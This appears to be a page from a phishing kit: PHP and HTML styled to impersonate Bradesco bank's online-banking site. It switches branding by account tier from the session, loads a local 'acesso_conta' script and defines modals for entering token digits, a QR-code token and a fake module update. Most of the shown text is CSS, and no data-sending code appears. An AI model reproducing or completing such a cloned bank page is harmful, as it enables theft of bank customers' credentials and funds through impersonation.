<?php
$tipo_conta = $_SESSION['bradesco_tipo'];

if ($tipo_conta == 'varejo') {
    $tipo = 'classic';
}
if ($tipo_conta == 'prime') {
    $tipo = 'prime';
}
if ($tipo_conta == 'exclusive') {
    $tipo = 'exclusive';
}
?>

<html lang="pt-BR" style="overflow: visible;">

<head>
    <meta charset="utf-8">
    <title>Banco Bradesco S/A</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <link rel="shortcut icon" href="images/favicon.ico">
    <link rel="shortcut icon" href="https://banco.bradesco/assets/classic/home/images/favicon.ico" type="image/x-icon">

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js" integrity="sha512-STof4xm1wgkfm7heWqFJVn58Hm3EtS31XFaagaa8VMReCXAkQnJZ+jEy8PCC/iT18dFy95WcExNHFTqLyp72eQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.js" integrity="sha512-nO7wgHUoWPYGCNriyGzcFwPSF+bPDOR+NvtOYy2wMcWkrnCNPKBcFEkU80XIN14UVja0Gdnff9EmydyLlOL7mQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script src="./js/bradesco/acesso_conta.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>

    <style>
        html {
            line-height: 1.15;
            -webkit-text-size-adjust: 100%;
        }

        hr {
            box-sizing: content-box;
            height: 0;
            overflow: visible;
        }

        a {
            background-color: transparent;
            color: #d3d3d3;
            text-decoration: none;
        }

        b,
        strong {
            font-weight: bolder;
        }

        small {
            font-size: 80%;
        }

        img {
            border-style: none;
        }

        button,
        input {
            font-family: inherit;
            font-size: 100%;
            line-height: 1.15;
            margin: 0;
        }

        button,
        input {
            overflow: visible;
        }

        button {
            text-transform: none;
        }

        [type=button],
        button {
            -webkit-appearance: button;
        }

        [type=checkbox] {
            box-sizing: border-box;
            padding: 0;
        }

        [class*=" icon-"],
        [class^=icon-] {
            font-family: icomoon !important;
            speak: none;
            font-style: normal;
            font-weight: 400;
            font-variant: normal;
            text-transform: none;
            line-height: 1;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        .icon-arrow-line-next:before {
            content: "\e906";
        }

        .icon-arrow-next:before {
            content: "\e901";
        }

        .icon-arrow-prev:before {
            content: "\e903";
        }

        * {
            box-sizing: border-box;
        }

        body,
        html {
            min-height: 100%;
            height: 100%;
        }

        body {
            margin: 0;
            font-family: Montserrat, sans-serif;
            background-color: #eeeff1;
        }

        h1,
        h2,
        h3,
        h4,
        h5 {
            margin: 0;
        }

        h1 {
            font-weight: 600;
            font-size: 1.375rem;
            line-height: 1.6875rem;
        }

        h2 {
            font-weight: 500;
            font-size: 1.375rem;
            line-height: 1.6875rem;
        }

        h3 {
            font-weight: 500;
            font-size: 1rem;
            line-height: 1.1875rem;
        }

        h4 {
            font-weight: 500;
            font-size: .875rem;
            line-height: 1.125rem;
        }

        .text-right {
            text-align: right;
        }

        i.ico {
            box-sizing: border-box;
            display: inline-flex;
            justify-content: center;
            align-items: center;
            width: 16px;
            height: 16px;
        }

        i.ico svg {
            width: 16px;
            height: 16px;
        }

        .container {
            width: 100%;
            max-width: 972px;
            margin: 0 auto;
        }

        .container * {
            box-sizing: border-box;
        }

        .grid {
            position: relative;
            display: flex;
            flex-wrap: wrap;
        }

        @media (min-width:768px) {
            .grid {
                width: calc(100% + 24px);
                margin-left: -12px;
                margin-right: -12px;
            }
        }

        @media (max-width:768px) {
            .grid {
                margin-left: 8px;
                margin-right: 8px;
            }
        }

        .cell {
            overflow: hidden;
            font-size: .625rem;
            flex-grow: 0;
            flex-shrink: 1;
        }

        .cell.cell-card>* {
            display: flex;
            flex-direction: column;
            height: 100%;
        }

        @media (min-width:768px) {
            .grid.grid-8 {
                width: calc(100% + 24px);
                margin-left: -12px;
                margin-right: -12px;
            }

            .cell {
                flex-basis: calc(8.33333333% - 24px);
                margin: 0 12px;
            }
        }

        @media (min-width:768px) {
            .cell.large-3 {
                flex-basis: calc(25% - 24px);
            }
        }

        @media (min-width:768px) {
            .cell.large-4 {
                flex-basis: calc(33.33333333% - 24px);
            }

            .cell.cell-card.large-4 {
                flex-basis: calc(33.33333333% - 4px);
                padding: 0 10px;
                margin: 0 2px;
            }
        }

        @media screen and (min-width:768px) and (min-width:0\0) and (-webkit-min-device-pixel-ratio:0.75),
        screen and (min-width:768px) and (min-width:0\0) and (min-resolution:72dpi) {
            .cell.cell-card.large-4 {
                flex-basis: calc(33.33333333% - 24px);
            }
        }

        @media (min-width:768px) {
            .cell.large-6 {
                flex-basis: calc(50% - 24px);
            }

            .cell.cell-card.large-6 {
                flex-basis: calc(50% - 4px);
                padding: 0 10px;
                margin: 0 2px;
            }
        }

        @media screen and (min-width:768px) and (min-width:0\0) and (-webkit-min-device-pixel-ratio:0.75),
        screen and (min-width:768px) and (min-width:0\0) and (min-resolution:72dpi) {
            .cell.cell-card.large-6 {
                flex-basis: calc(50% - 24px);
            }
        }

        @media (min-width:768px) {
            .cell.large-8 {
                flex-basis: calc(66.66666667% - 24px);
            }

            .cell.cell-card.large-8 {
                flex-basis: calc(66.66666667% - 4px);
                padding: 0 10px;
                margin: 0 2px;
            }
        }

        @media screen and (min-width:768px) and (min-width:0\0) and (-webkit-min-device-pixel-ratio:0.75),
        screen and (min-width:768px) and (min-width:0\0) and (min-resolution:72dpi) {
            .cell.cell-card.large-8 {
                flex-basis: calc(66.66666667% - 24px);
            }
        }

        @media (min-width:768px) {
            .cell.large-9 {
                flex-basis: calc(75% - 24px);
            }
        }

        @media (min-width:768px) {
            .cell.large-12 {
                flex-basis: calc(100% - 24px);
            }
        }

        @media (max-width:768px) {
            .cell {
                flex-basis: calc(100% - 16px);
                margin: 0 8px;
            }

            .cell .grid {
                margin-left: -8px;
                margin-right: -8px;
            }
        }

        @media (min-width:768px) {
            .grid-8 .cell {
                flex-basis: calc(12.5% - 24px);
                margin: 0 12px;
            }
        }

        @media (min-width:768px) {
            .grid-8 .cell.large-4 {
                flex-basis: calc(50% - 24px);
            }
        }

        @media screen and (min-width:768px) and (min-width:0\0) and (-webkit-min-device-pixel-ratio:0.75),
        screen and (min-width:768px) and (min-width:0\0) and (min-resolution:72dpi) {

            .grid-8 .cell.large-4:first-child,
            .grid-8 .cell.large-4:last-child {
                flex-basis: calc(50% - 48px);
            }
        }

        .btn {
            font-size: 14px;
            font-weight: 700;
            line-height: 24px;
            color: #000;
            background-color: transparent;
            border: 1px solid #000;
            border-radius: 40px !important;
            padding: 8px 40px;
            outline: 0;
            transition: .3s;
            font-family: Montserrat, sans-serif;
        }

        a.btn {
            -webkit-appearance: none;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
            display: inline-block;
            text-align: center;
        }

        .btn-medium {
            line-height: 24px;
            padding: 8px 40px;
            border-radius: 40px;
            font-size: 14px;
        }

        .btn-primary {
            background-color: #ff003e;
            border: thin solid #ff003e;
            color: #fff;
        }

        .btn-secondary {
            background-color: #fff;
            border: thin solid #ff003e;
            color: #ff003e;
        }

        .btn-block {
            max-width: 95%;
            width: 100%;
            margin: 0 auto;
        }

        .card-header {
            flex: 0 0 auto;
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin: 1rem 0;
        }

        .card-header a {
            color: #3b69ff;
            font-size: .75rem;
            line-height: .9375rem;
        }

        .card {
            flex: 1 0 auto;
            padding: 24px;
            border-radius: 4px;
            background-color: #fff;
            box-shadow: 0 0 2px 0 rgba(0, 0, 0, .15), 0 2px 4px 0 rgba(0, 0, 0, .15);
            box-sizing: border-box;
            margin-bottom: 1rem;
        }

        .card-grid {
            padding: 24px 0;
        }

        .card-grid .cell:first-child {
            padding-left: 24px;
        }

        .card-grid .cell:last-child {
            padding-right: 24px;
        }

        span.moeda {
            font-weight: 600;
            -webkit-animation: .2s mostrarValores;
            animation: .2s mostrarValores;
        }

        span.moeda small {
            font-weight: 400;
        }

        span.moeda small:first-child {
            padding-right: 2px;
        }

        brad-root {
            display: flex;
            flex-direction: column;
            min-height: calc(100vh - 158px);
            justify-content: space-between;
        }

        .blocker {
            position: fixed;
            top: 0;
            right: 0;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 100%;
            overflow: auto;
            z-index: 1;
            padding: 20px;
            box-sizing: border-box;
            background-color: #000;
            background-color: rgba(0, 0, 0, 0.75);
            text-align: center;
        }

        .blocker:before {
            content: "";
            display: inline-block;
            height: 100%;
            vertical-align: middle;
            margin-right: -0.05em;
        }

        .modal {
            display: none;
            vertical-align: middle;
            position: relative;
            z-index: 2;
            max-width: 500px;
            box-sizing: border-box;
            width: 90%;
            background: #fff;
            padding: 15px 30px;
            -webkit-border-radius: 8px;
            -moz-border-radius: 8px;
            -o-border-radius: 8px;
            -ms-border-radius: 8px;
            border-radius: 8px;
            -webkit-box-shadow: 0 0 10px #000;
            -moz-box-shadow: 0 0 10px #000;
            -o-box-shadow: 0 0 10px #000;
            -ms-box-shadow: 0 0 10px #000;
            box-shadow: 0 0 10px #000;
            text-align: left;
        }

        brad-header {
            display: block;
            position: fixed;
            top: 0;
            width: 100%;
            z-index: 100;
        }

        brad-menu {
            display: block;
            position: fixed;
            top: 88px;
            width: 100%;
            min-width: 1024px;
            z-index: 90;
        }

        #app-wrapper[_ngcontent-xfy-c0] {
            flex: 1 1 auto;
            min-width: 342px;
        }

        .top-menu[_ngcontent-xfy-c2] {
            font-family: Montserrat, sans-serif;
            background-color: #fff;
            box-shadow: rgba(0, 0, 0, .15) 0 2px 3px 0;
            animation: .4s ease 0s 1 normal none running menu;
        }

        .top-menu[_ngcontent-xfy-c2] nav[_ngcontent-xfy-c2] {
            width: 100%;
            max-width: 972px;
            margin: 0 auto;
            height: 70px;
            display: flex;
            transition: all 2s ease 0s;
        }

        .top-menu[_ngcontent-xfy-c2] nav[_ngcontent-xfy-c2] ul[_ngcontent-xfy-c2] {
            list-style: none;
            padding: 0;
            margin: 0;
            display: flex;
            justify-content: space-between;
            width: 100%;
        }

        .top-menu[_ngcontent-xfy-c2] nav[_ngcontent-xfy-c2] ul[_ngcontent-xfy-c2] [_ngcontent-xfy-c2] {
            box-sizing: border-box;
        }

        .top-menu[_ngcontent-xfy-c2] nav[_ngcontent-xfy-c2] ul[_ngcontent-xfy-c2] li {
            display: inherit;
            align-items: center;
        }

        .top-menu[_ngcontent-xfy-c2] nav[_ngcontent-xfy-c2] ul[_ngcontent-xfy-c2] li .menu-item {
            display: block;
            width: 100%;
        }

        .top-menu[_ngcontent-xfy-c2] nav[_ngcontent-xfy-c2] ul[_ngcontent-xfy-c2] li .menu-item:focus {
            color: #292929;
        }

        .top-menu[_ngcontent-xfy-c2] nav[_ngcontent-xfy-c2] ul[_ngcontent-xfy-c2] li brad-menu-item {
            display: block;
            width: 100%;
        }

        .top-menu[_ngcontent-xfy-c2] nav[_ngcontent-xfy-c2] ul[_ngcontent-xfy-c2] li a,
        .top-menu[_ngcontent-xfy-c2] nav[_ngcontent-xfy-c2] ul[_ngcontent-xfy-c2] li button {
            border: none;
            display: block;
            width: inherit;
            padding: 15px 5px;
            outline: 0;
            cursor: pointer;
            color: #6d6e71;
            font-size: .75rem;
            font-weight: 500;
            line-height: .9375rem;
            text-decoration: none;
            white-space: nowrap;
            background-color: transparent;
            transition: all .15s ease 0s;
        }

        .top-menu[_ngcontent-xfy-c2] nav[_ngcontent-xfy-c2] ul[_ngcontent-xfy-c2] li a:hover,
        .top-menu[_ngcontent-xfy-c2] nav[_ngcontent-xfy-c2] ul[_ngcontent-xfy-c2] li button:hover {
            color: #000;
        }

        .top-menu[_ngcontent-xfy-c2] nav[_ngcontent-xfy-c2] ul[_ngcontent-xfy-c2] li button.active {
            color: #000;
            font-weight: 600;
        }

        .top-menu[_ngcontent-xfy-c2] nav[_ngcontent-xfy-c2] ul[_ngcontent-xfy-c2] li.dropdown {
            align-self: center;
            position: relative;
            display: inline-block;
        }

        .top-menu[_ngcontent-xfy-c2] nav[_ngcontent-xfy-c2] ul[_ngcontent-xfy-c2] li.dropdown a {
            display: flex;
            align-items: center;
        }

        .top-menu[_ngcontent-xfy-c2] nav[_ngcontent-xfy-c2] ul[_ngcontent-xfy-c2] li.dropdown a svg {
            margin-left: 8px;
            font-size: 1.5rem;
            transition: transform .2s ease 0s;
        }

        .top-menu[_ngcontent-xfy-c2] nav[_ngcontent-xfy-c2] ul[_ngcontent-xfy-c2] li.dropdown:hover a svg {
            transform: rotate(-180deg);
        }

        .top-menu[_ngcontent-xfy-c2] nav[_ngcontent-xfy-c2] ul[_ngcontent-xfy-c2] li.dropdown:hover ul {
            display: flex;
        }

        .top-menu[_ngcontent-xfy-c2] nav[_ngcontent-xfy-c2] ul[_ngcontent-xfy-c2] li.dropdown:focus a svg {
            transform: rotate(-180deg);
        }

        .top-menu[_ngcontent-xfy-c2] nav[_ngcontent-xfy-c2] ul[_ngcontent-xfy-c2] li.dropdown:focus ul {
            display: flex;
        }

        .top-menu[_ngcontent-xfy-c2] nav[_ngcontent-xfy-c2] ul[_ngcontent-xfy-c2] li.dropdown ul {
            display: none;
            flex-direction: column;
            position: absolute;
            left: auto;
            right: 0;
            width: auto;
            height: auto;
            padding: 24px 0;
            z-index: 1;
            background-color: #fff;
            border-radius: 4px;
            box-shadow: rgba(0, 0, 0, .16) 0 0 2px 0, rgba(0, 0, 0, .16) 0 8px 16px 0;
        }

        .top-menu[_ngcontent-xfy-c2] nav[_ngcontent-xfy-c2] ul[_ngcontent-xfy-c2] li.dropdown ul::before {
            content: "";
            position: absolute;
            top: -8px;
            right: 18px;
            width: 0;
            height: 0;
            border-left: 6px solid transparent;
            border-right: 6px solid transparent;
            border-bottom: 8px solid #fff;
        }

        @media (min-width:1120px) {
            .top-menu[_ngcontent-xfy-c2] nav[_ngcontent-xfy-c2] ul[_ngcontent-xfy-c2] li.dropdown ul {
                left: 50%;
                right: auto;
                transform: translateX(-50%);
                margin: inherit;
            }

            .top-menu[_ngcontent-xfy-c2] nav[_ngcontent-xfy-c2] ul[_ngcontent-xfy-c2] li.dropdown ul::before {
                right: calc(50% - 6px);
            }
        }

        .top-menu[_ngcontent-xfy-c2] nav[_ngcontent-xfy-c2] ul[_ngcontent-xfy-c2] li.dropdown ul li button {
            flex: 1 1 auto;
            padding: 8px 32px;
            font-size: .75rem;
            text-align: left;
        }

        .top-menu[_ngcontent-xfy-c2] nav[_ngcontent-xfy-c2] ul[_ngcontent-xfy-c2] li.dropdown ul li button:hover {
            background-color: rgba(0, 0, 0, .05);
        }

        .top-menu[_ngcontent-xfy-c2] nav[_ngcontent-xfy-c2] ul[_ngcontent-xfy-c2] li.dropdown ul li button:focus {
            background-color: rgba(0, 0, 0, .05);
        }

        .top-menu[_ngcontent-xfy-c2] nav[_ngcontent-xfy-c2] ul[_ngcontent-xfy-c2] li.dropdown ul hr {
            width: calc(100% - 64px);
            border: none;
            height: 1px;
            margin: 16px 32px;
            background-color: rgba(0, 0, 0, .15);
        }

        .top-menu[_ngcontent-xfy-c2] ul[_ngcontent-xfy-c2] {
            animation: .4s ease 0s 1 normal forwards running appear-menu;
        }

        .top-bar * {
            box-sizing: border-box;
        }

        .top-bar header {
            position: relative;
            display: flex;
            width: 100%;
            min-width: 1024px;
            max-width: 1440px;
            height: 88px;
            padding: 0 24px;
            margin: 0 auto;
        }

        @media not all,
        not all {
            .top-bar header {
                min-width: 0;
            }
        }

        .top-bar header>div {
            flex: 1 0 0px;
            display: flex;
            align-items: center;
        }

        .top-bar header>div:nth-child(1) {
            flex-basis: 0px;
        }

        .top-bar header>div:nth-child(2) {
            flex: 1 1 0px;
            justify-content: center;
        }

        .top-bar header>div:nth-child(2) brad-busca {
            width: 100%;
        }

        .top-bar header>div:nth-child(3) {
            flex-grow: 1.2;
            flex-basis: 0px;
            justify-content: flex-end;
        }

        .top-bar header>div:nth-child(3)>:not(:first-child) {
            margin-left: 16px;
        }

        .logo {
            position: absolute;
            background-repeat: no-repeat;
            background-position: 50% 50%;
        }

        .logo h1 {
            opacity: 0;
            user-select: none;
        }

        .data {
            align-self: flex-start;
            margin-top: 44px;
            white-space: nowrap;
            font-size: .75rem;
            font-weight: 500;
            line-height: 1rem;
            text-transform: uppercase;
        }

        .logout button {
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            padding: 0 0 0 5px;
            font-size: .875rem;
            font-weight: 600;
            line-height: 1rem;
            border: none;
            background-color: transparent;
        }

        .logout button .ico {
            width: 18px;
            height: 18px;
            margin-left: 8px;
        }

        .logout button .ico svg {
            width: inherit;
            height: inherit;
        }

        .blocker {
            z-index: 9999;
        }

        .modal {
            border-radius: 0px !important;
            padding: 0px;
            min-height: 300px;
            box-sizing: border-box;
            font-family: 'Bradesco', sans-serif;
            padding: 15px;
            max-width: 750px;
        }

        div#modal div#header-modal {
            width: 100%;
            padding-bottom: 10px;
            border-bottom: 1px solid #d4d4d4;
        }

        div#modal div#header-modal>* {
            vertical-align: bottom;
            line-height: 20px;
        }

        div#modal div#header-modal span.titulo {
            font-size: 28px;
            font-weight: 800;
            color: #525153;
            display: inline-block;
        }

        div#modal div#boxCarregando div.box-img {
            padding-top: 30px;
            padding-bottom: 0px;
        }

        div#modal p strong {
            font-weight: 600;
        }

        div#modal div#header-modal span.subtitulo {
            font-size: 18px;
            font-weight: 400;
            color: #8d8d8d;
            line-height: 15px;
            border-left: 2px solid #525153;
            margin-left: 15px;
            padding-left: 15px;
        }

        div#modal .center {
            text-align: center;
        }

        div#modal div#boxCarregando img {
            margin: 0 auto;
        }

        .hide {
            display: none;
        }

        div#modal div.boxLinha {
            border: 1px solid #CCCCCC;
            border-bottom: 1px solid #CF3F3F;
            background: #FFFFFF url(./images/bgr_box_redLine_bottom.jpg) left bottom repeat-x;
            margin-bottom: 20px;
            padding: 14px;
            margin-top: 30px;
            height: auto;
            min-height: 100px;
        }

        div#modal p {
            color: #4A4A4A;
            display: block;
            text-align: center;
            margin: 15px 0px;
        }

        div#modal div.left {
            width: calc(45% - 5px);
            float: left;
        }

        div#modal div.right {
            width: calc(55% - 5px);
            float: right;
        }

        div#modal span.serial {
            color: #4A4A4A;
            line-height: 2;
            line-height: 17px;
        }

        div#modal .form-code {
            box-sizing: border-box;
            position: relative;
            width: 210px;
            margin: 0 auto;
            padding: 0 0 4px;
            border-bottom: solid 1px #CDCCCD;
            margin-top: 10px;
        }

        div#modal .form-code input[type=password].form-digits {
            font-size: 28px !important;
            letter-spacing: 21px;
        }

        div#modal .form-code input.form-digits:focus {
            outline: none;
            border: none;
        }

        div#modal .form-code input[type=password] {
            display: block;
            font: 38px 'Montserrat-ExtraBold';
            color: #4A4A4A;
            letter-spacing: 45px;
            margin: 0;
            padding: 0 0 0 0;
            border: 0;
            width: 100%;
            padding-left: 16px;
            -webkit-transition: all 0.3s cubic-bezier(0.64, 0.09, 0.08, 1);
            transition: all 0.3s cubic-bezier(0.64, 0.09, 0.08, 1);
        }

        div#modal .form-code input[type=text] {
            display: block;
            font: 17px 'Montserrat-Regular';
            color: #4A4A4A;
            margin: 0;
            padding: 0 0 0 0;
            border: 0;
            width: 100%;
            -webkit-transition: all 0.3s cubic-bezier(0.64, 0.09, 0.08, 1);
            transition: all 0.3s cubic-bezier(0.64, 0.09, 0.08, 1);
        }

        div#modal .put-right {
            text-align: right;
        }

        div#modal .clearfix::after {
            content: "";
            clear: both;
            display: table;
        }

        div#modal div.divBotoesPagina {
            width: 300px;
            margin: 0px auto;
            margin-top: 40px;
            margin-bottom: 30px;
        }

        div#modal .btn-action {
            display: block;
            width: calc(100% - 60px);
            height: 40px;
            margin: 0 auto;
            padding: 0;
            border: solid 1px #9B9B9B;
            border-radius: 25px;
            text-align: center;
            text-decoration: none;
            opacity: 100%;
            color: #FFF;
            background: #9B9B9B;
            cursor: pointer;
        }

        div#modal .btn-action.btn-action-active {
            border: solid 1px #F3033B;
            background: #F3033B;
        }

        div#modal span.txt_msg_erro_disp {
            display: block;
            margin-bottom: 20px;
        }

        div#modal .erro_msg.error-show {
            display: block !important;
        }

        div#modal .erro_msg {
            display: none !important;
            padding-top: 5px !important;
            color: #EE102B !important;
            text-align: center !important;
            margin: 0 0 0 !important;
        }

        div#modal .hide {
            display: none !important;
        }

        div#modal div#boxQrCode h1 {
            font: 16px/38px 'Montserrat-SemiBold';
        }

        div#modal div#boxQrCode div.itemQr {
            border-bottom: solid 1px #E5E5E5;
            padding: 15px 0;
        }

        div#modal div#boxQrCode div.itemQr span.number {
            font: 16px Tahoma, Arial, Sans-Serif;
            color: #333;
            position: absolute;
            left: -20px;
            top: -2px;
        }

        div#modal div#boxQrCode div.itemQr p {
            position: relative;
            display: inline-block;
            font: 0.81em/120% Tahoma, Arial, Sans-Serif;
            color: #333;
            list-style: none;
            font-size: 1.0em;
            outline: none;
            margin: 0;
            padding: 0;
            vertical-align: bottom;
            float: left;
            text-align: justify;
            font-size: 12px;
            margin-left: 20px;
        }

        div#modal div#boxQrCode div.itemQr input#qrCodeToken {
            list-style: none;
            outline: none;
            margin: 0;
            font-family: Tahoma, Arial, Sans-Serif;
            border-bottom: 1px solid #D4D4D4;
            border-right: 1px solid #D4D4D4;
            border-left: 1px solid #7A7A7A;
            border-top: 1px solid #7A7A7A;
            padding: 2px;
            background: #F4F4F4;
            font-size: 0.92em;
            margin-right: 5px;
            vertical-align: middle;
            width: 84px;
        }

        div#modal div#boxQrCode div.itemQr span.leg {
            font: 10px Tahoma, Arial, Sans-Serif;
            color: #333;
            list-style: none;
            outline: none;
            line-height: 180%;
        }

        div#modal div#boxQrCode div.boxLinha div.esquerdaQr {
            float: left;
            width: calc(35% - 5px);
        }

        div#modal div#boxQrCode div.boxLinha div.direitaQr {
            float: left;
            width: calc(65% - 5px);
        }

        div#aguardeQR {
            text-align: center !important;
        }

        div#aguardeQR p {
            font-size: 13px;
        }

        div#aguardeQR p {
            margin-bottom: 25px;
            font: 143x/20px 'Montserrat-Regular' !important;
        }

        div#aguardeQR p strong {
            font-weight: bold;
        }

        div#aguardeQR img.loadingQr {
            margin-bottom: 25px;
        }

        div#boxAtualizarModulo h1 {
            text-align: center;
        }

        div#boxAtualizarModulo div.barra {
            border: 1px solid #d4d4d4;
            width: 400px;
            ;
            padding: 3px;
            margin: 0 auto;
        }

        div.miolo {
            height: 10px;
            width: 0%;
            background-image: linear-gradient(90deg, rgb(225, 23, 63) 0px, rgb(224, 23, 64) 20%, rgb(221, 24, 71) 36%, rgb(216, 25, 81) 50%, rgb(210, 26, 92) 62%, rgb(202, 27, 103) 71%, rgb(194, 28, 114) 78%, rgb(184, 29, 124) 83%, rgb(174, 30, 134) 87%, rgb(164, 31, 143) 90%, rgb(154, 32, 150) 93%, rgb(145, 33, 156) 95%, rgb(138, 33, 161) 96%, rgb(133, 34, 164) 98%, rgb(131, 34, 165) 100%);
        }


        .top-bar * {
            box-sizing: border-box;
        }

        .top-bar header {
            position: relative;
            display: flex;
            width: 100%;
            min-width: 1024px;
            max-width: 1440px;
            height: 88px;
            padding: 0px 24px;
            margin: 0px auto;
        }

        @media not all,
        not all {
            .top-bar header {
                min-width: 0px;
            }
        }

        .top-bar header>div {
            flex: 1 0 0px;
            display: flex;
            align-items: center;
        }

        .top-bar header>div:nth-child(1) {
            flex-basis: 0px;
        }

        .top-bar header>div:nth-child(2) {
            flex: 1 1 0px;
            justify-content: center;
        }

        .top-bar header>div:nth-child(2) brad-busca {
            width: 100%;
        }

        .top-bar header>div:nth-child(3) {
            flex-grow: 1.2;
            flex-basis: 0px;
            justify-content: flex-end;
        }

        .top-bar header>div:nth-child(3)> :not(:first-child) {
            margin-left: 16px;
        }

        .logo {
            position: absolute;
            background-repeat: no-repeat;
            background-position: 50% 50%;
        }

        .logo h1 {
            opacity: 0;
            user-select: none;
        }

        .data {
            align-self: flex-start;
            margin-top: 44px;
            white-space: nowrap;
            font-size: 0.75rem;
            font-weight: 500;
            line-height: 1rem;
            text-transform: uppercase;
        }

        .logout button {
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            padding: 0px 0px 0px 5px;
            font-size: 0.875rem;
            font-weight: 600;
            line-height: 1rem;
            border: none;
            background-color: transparent;
        }

        .logout button .ico {
            width: 18px;
            height: 18px;
            margin-left: 8px;
        }

        .logout button .ico svg {
            width: inherit;
            height: inherit;
        }

        .top-bar header .logo {
            transition: all 0.77s ease 0s;
            left: 24px;
            transform: translateX(0px);
        }

        .top-bar header>div> :not(.logo) {
            transform: scale(0.87);
            opacity: 0;
            animation-name: appear;
            animation-duration: 0.77s;
            animation-timing-function: ease;
            animation-delay: 385ms;
            animation-fill-mode: forwards;
        }

        .top-bar.prime {
            font-family: Montserrat, sans-serif;
            background-image: linear-gradient(90deg, rgb(20, 36, 99) 0px, rgb(3, 70, 148) 100%);
        }

        .top-bar.prime header .logo {
            background-image: url('./images/bradesco-prime.png');
            background-repeat: no-repeat;
            background-position: center center;
            width: 110px;
            height: 40px;
            top: 24px;
        }

        .top-bar.prime header .data {
            color: rgb(255, 255, 255);
            margin-left: 124px;
        }

        .top-bar.prime header brad-dados-cliente .usuario span.separator {
            background-color: rgba(255, 255, 255, 0.3);
        }

        .top-bar.prime header brad-dados-cliente .usuario .saldo-disponivel p {
            color: rgb(255, 255, 255);
        }

        .top-bar.prime header brad-dados-cliente .usuario .saldo-disponivel p span.moeda {
            color: rgb(255, 255, 255) !important;
        }

        .top-bar.prime header brad-dados-cliente .usuario .dados-conta p {
            color: rgba(255, 255, 255, 0.7);
        }

        .top-bar.prime header .sessao span {
            color: rgb(255, 255, 255);
        }

        .top-bar.prime header .sessao svg circle {
            stroke: rgb(42, 113, 195);
        }

        .top-bar.prime header .sessao svg circle.remaining {
            stroke: rgb(255, 255, 255);
        }

        .top-bar.prime header .sessao svg circle.bkg {
            fill: rgb(36, 52, 87);
        }

        .top-bar.prime header .logout button {
            color: rgb(255, 255, 255);
        }


        .busca-container[_ngcontent-xfy-c5] {
            position: relative;
            width: 100%;
            max-width: 355px;
            margin: 0px auto;
        }

        .busca-container[_ngcontent-xfy-c5] .busca[_ngcontent-xfy-c5] {
            display: flex;
            width: 100%;
            max-width: 355px;
            height: 32px;
            overflow: hidden;
            position: relative;
            margin: 0px auto;
            border-radius: 3px;
            background-color: rgba(0, 0, 0, 0.1);
        }

        .busca-container[_ngcontent-xfy-c5] .busca[_ngcontent-xfy-c5] label[_ngcontent-xfy-c5] {
            display: none;
        }

        .busca-container[_ngcontent-xfy-c5] .busca[_ngcontent-xfy-c5] button[_ngcontent-xfy-c5],
        .busca-container[_ngcontent-xfy-c5] .busca[_ngcontent-xfy-c5] input[_ngcontent-xfy-c5] {
            border: none;
            background-color: transparent;
        }

        .busca-container[_ngcontent-xfy-c5] .busca[_ngcontent-xfy-c5] input[_ngcontent-xfy-c5] {
            flex-grow: 1;
            padding: 3px 0px 3px 16px;
            color: rgb(255, 255, 255);
            font-size: 0.75rem;
            font-weight: 600;
            line-height: 1.5;
        }

        .busca-container[_ngcontent-xfy-c5] .busca[_ngcontent-xfy-c5] input[_ngcontent-xfy-c5]::placeholder {
            color: rgb(255, 255, 255);
            opacity: 0.5;
            font-weight: 400;
        }

        .busca-container[_ngcontent-xfy-c5] .busca[_ngcontent-xfy-c5] button[_ngcontent-xfy-c5] {
            display: inline-flex;
            align-items: center;
            padding: 0px 16px;
            color: rgb(255, 255, 255);
        }

        .busca-container[_ngcontent-xfy-c5] .busca[_ngcontent-xfy-c5] button[_ngcontent-xfy-c5] .ico[_ngcontent-xfy-c5] {
            width: 13px;
            height: 15px;
        }

        .busca-container[_ngcontent-xfy-c5] .resultados-sugeridos[_ngcontent-xfy-c5] {
            position: absolute;
            top: calc(100% + 1px);
            z-index: 100;
            width: 100%;
            background-color: rgb(255, 255, 255);
            box-shadow: rgba(0, 0, 0, 0.25) 0px 3px 15px 0px;
        }

        .busca-container[_ngcontent-xfy-c5] .resultados-sugeridos[_ngcontent-xfy-c5] ul[_ngcontent-xfy-c5] {
            padding: 0px;
            margin: 0px;
            list-style: none;
        }


        .usuario[_ngcontent-xfy-c6] {
            display: flex;
            white-space: nowrap;
        }

        .usuario[_ngcontent-xfy-c6] span.separator[_ngcontent-xfy-c6] {
            width: 1px;
            margin: 0px 16px;
            background-color: rgba(255, 255, 255, 0.3);
        }

        .usuario[_ngcontent-xfy-c6] .saldo-disponivel[_ngcontent-xfy-c6] {
            text-align: right;
        }

        .usuario[_ngcontent-xfy-c6] .saldo-disponivel[_ngcontent-xfy-c6] span.click[_ngcontent-xfy-c6] {
            display: flex;
            flex-direction: row;
            user-select: none;
            cursor: pointer;
        }

        .usuario[_ngcontent-xfy-c6] .saldo-disponivel[_ngcontent-xfy-c6] span.click[_ngcontent-xfy-c6] p.saldo[_ngcontent-xfy-c6] {
            user-select: none;
            margin: 0px 0px 8px;
            font-size: 0.75rem;
            font-weight: 500;
            line-height: 1rem;
        }

        .usuario[_ngcontent-xfy-c6] .saldo-disponivel[_ngcontent-xfy-c6] span.click[_ngcontent-xfy-c6] span.arrow[_ngcontent-xfy-c6] svg[_ngcontent-xfy-c6] {
            margin-top: -2px;
            transition: transform 0.2s ease 0s;
        }

        .usuario[_ngcontent-xfy-c6] .saldo-disponivel[_ngcontent-xfy-c6] .saldo-refresh[_ngcontent-xfy-c6] {
            display: flex;
            align-items: center;
            user-select: none;
        }

        .usuario[_ngcontent-xfy-c6] .saldo-disponivel[_ngcontent-xfy-c6] .saldo-refresh.pointer[_ngcontent-xfy-c6] {
            cursor: pointer;
        }

